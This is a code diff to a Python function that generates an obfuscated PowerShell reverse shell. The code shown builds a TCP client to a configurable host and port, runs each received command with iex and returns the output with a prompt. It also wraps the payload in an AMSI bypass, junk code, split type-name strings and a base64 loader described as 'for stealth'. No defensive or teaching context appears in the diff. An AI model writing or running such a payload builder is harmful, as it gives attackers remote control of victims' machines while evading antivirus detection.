@@ -40,13 +40,17 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     amsi_bypass = amsi_bypass_reflection(var)
 
     # --- The Fully Fixed, Reliable Core Shell ---
+    tcpclient_str = split_string('System.Net.Sockets.TCPClient')
+    asciiencoding_str = split_string('System.Text.ASCIIEncoding')
+
     core_shell = (
         junk_code() +
-        f"${var['tcpclient']} = New-Object -TypeName {split_string('System.Net.Sockets.TCPClient')} -ArgumentList '{host}',{port}\n"
+        f"${var['tcpclient']}_typename = {tcpclient_str}\n"
+        f"${var['tcpclient']} = New-Object -TypeName ([string]${var['tcpclient']}_typename) -ArgumentList '{host}',{port}\n"
         f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
         f"${var['bytes']} = 0..65535|%{{0}}\n"
         f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
-        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
+        f"    ${{var['data']}} = (New-Object -TypeName {asciiencoding_str}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
         f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
         f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n"
         f"    ${{var['sendbyte']}} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
@@ -55,6 +59,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         "}\n" +
         junk_code()
     )
+
 
     # --- Loader: Uses base64 for stealth, minimal obfuscation here ---
     core_shell_bytes = core_shell.encode('utf-8')
